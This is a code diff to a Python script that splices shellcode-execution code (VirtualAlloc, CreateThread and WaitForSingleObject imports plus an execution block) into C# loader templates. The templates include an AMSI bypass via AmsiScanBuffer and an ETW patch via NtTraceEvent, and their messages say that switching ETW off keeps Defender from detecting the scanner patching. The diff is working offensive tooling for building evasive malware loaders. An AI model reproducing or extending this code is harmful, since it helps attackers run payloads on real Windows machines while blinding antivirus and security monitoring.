@@ -44,10 +44,18 @@ GET_SC_METHOD = f'''
         }}
 '''
 
-# VirtualAlloc + CreateThread + WaitForSingleObject.
-# Needed by loaders 04 and 07 that only patch, they don't execute shellcode.
+# Full set: VirtualAlloc + CreateThread + WaitForSingleObject.
+# Used by loaders that do NOT already import VirtualAlloc.
 EXEC_IMPORTS = '''\
         [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
+        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+'''
+
+# CreateThread + WaitForSingleObject only.
+# Used by loaders 04 and 07 which already import VirtualAlloc.
+# Adding VirtualAlloc again would cause a duplicate DllImport compile error.
+THREAD_IMPORTS = '''\
         [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
         [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
 '''
@@ -180,36 +188,34 @@ def embed_03(src):
     return src
 
 # ============================================================
-# LOADER 04 - AMSI bypass
-# Add shellcode execution before the .NET assembly loading section.
+# LOADER 04 - AMSI bypass (AmsiScanBuffer indirect syscall version)
+# Add shellcode execution before the optional .NET assembly loading block.
+# Loader 04 already imports VirtualAlloc, so we only add CreateThread
+# and WaitForSingleObject to avoid a duplicate DllImport compile error.
 # ============================================================
 def embed_04(src):
     old = '''\
-                // If a .NET assembly path was passed as an argument, load it
-                // in-process where the AMSI patch is active.
+                // Optional: load a .NET assembly with AMSI already patched.
+                // Pass the assembly path as the first argument.
+                // Extra arguments are forwarded to the loaded assembly's Main.
                 if (args.Length > 0)'''
 
     new = EXEC_BLOCK + '''
-                // If a .NET assembly path was passed as an argument, load it
-                // in-process where the AMSI patch is active.
+                // Optional: load a .NET assembly with AMSI already patched.
+                // Pass the assembly path as the first argument.
+                // Extra arguments are forwarded to the loaded assembly's Main.
                 if (args.Length > 0)'''
 
     assert old in src, 'LOADER 04: assembly loading section not found'
     src = src.replace(old, new, 1)
 
-    # Add VirtualAlloc/CreateThread after the VirtualProtect import
-    # (VirtualProtect is the last DllImport in loader 04)
-    sig = '[DllImport("kernel32.dll", SetLastError = true)]\n        static extern bool VirtualProtect('
+    # LoadLibraryA is the last DllImport in loader 04.
+    # VirtualAlloc is already present, so we only add CreateThread + WaitForSingleObject.
+    sig = '[DllImport("kernel32.dll")] static extern IntPtr LoadLibraryA(string name);'
     pos = src.find(sig)
-    assert pos != -1, 'LOADER 04: VirtualProtect import not found'
-    end = src.index('\n', pos)      # [DllImport] line
-    end = src.index('\n', end+1)    # static extern bool VirtualProtect(
-    end = src.index('\n', end+1)    # IntPtr lpAddress,
-    end = src.index('\n', end+1)    # UIntPtr dwSize,
-    end = src.index('\n', end+1)    # uint flNewProtect,
-    end = src.index('\n', end+1)    # out uint lpflOldProtect
-    end = src.index('\n', end+1)    # );
-    src = src[:end+1] + '\n' + EXEC_IMPORTS + src[end+1:]
+    assert pos != -1, 'LOADER 04: LoadLibraryA import not found'
+    end = src.index('\n', pos) + 1
+    src = src[:end] + '\n' + THREAD_IMPORTS + src[end:]
 
     src = append_method(src, GET_SC_METHOD)
     return src
@@ -327,14 +333,15 @@ def embed_06(src):
     return src
 
 # ============================================================
-# LOADER 07 - ETW patch only
-# Add shellcode execution inside the success block.
+# LOADER 07 - ETW patch (NtTraceEvent indirect syscall version)
+# Add shellcode execution after the if(success)/else block.
+# Loader 07 already imports VirtualAlloc, so we only add CreateThread
+# and WaitForSingleObject to avoid a duplicate DllImport compile error.
 # ============================================================
 def embed_07(src):
-    # Insert shellcode execution AFTER the success prints, BEFORE the closing brace
-    # of the if(success) block. The last line in that block is the scanner advice print.
     old = '''\
-                Console.WriteLine("[*] Because telemetry is patched, the scanner patching will not be logged.");
+                Console.WriteLine("[*] With ETW off, the scanner patching will not generate");
+                Console.WriteLine("    a telemetry event that Defender can detect.");
             }
             else
             {
@@ -342,7 +349,8 @@ def embed_07(src):
             }'''
 
     new = '''\
-                Console.WriteLine("[*] Because telemetry is patched, the scanner patching will not be logged.");
+                Console.WriteLine("[*] With ETW off, the scanner patching will not generate");
+                Console.WriteLine("    a telemetry event that Defender can detect.");
             }
             else
             {
@@ -354,18 +362,15 @@ def embed_07(src):
     assert old in src, 'LOADER 07: success/else block not found'
     src = src.replace(old, new, 1)
 
-    # Add VirtualAlloc/CreateThread after the VirtualProtect import
-    sig = '[DllImport("kernel32.dll", SetLastError = true)]\n        static extern bool VirtualProtect('
+    # VirtualAlloc is the last DllImport in loader 07 (two-line declaration).
+    # Only add CreateThread + WaitForSingleObject.
+    sig = '[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(\n            IntPtr addr, uint size, uint allocType, uint protect);'
     pos = src.find(sig)
-    assert pos != -1, 'LOADER 07: VirtualProtect import not found'
-    end = src.index('\n', pos)      # [DllImport] line end
-    end = src.index('\n', end+1)    # static extern bool VirtualProtect(
-    end = src.index('\n', end+1)    # IntPtr lpAddress,
-    end = src.index('\n', end+1)    # UIntPtr dwSize,
-    end = src.index('\n', end+1)    # uint flNewProtect,
-    end = src.index('\n', end+1)    # out uint lpflOldProtect
-    end = src.index('\n', end+1)    # );
-    src = src[:end+1] + '\n' + EXEC_IMPORTS + src[end+1:]
+    assert pos != -1, 'LOADER 07: VirtualAlloc import not found'
+    end = src.index('\n', pos)      # first line of VirtualAlloc declaration
+    end = src.index('\n', end+1)    # closing );
+    end += 1
+    src = src[:end] + '\n' + THREAD_IMPORTS + src[end:]
 
     src = append_method(src, GET_SC_METHOD)
     return src
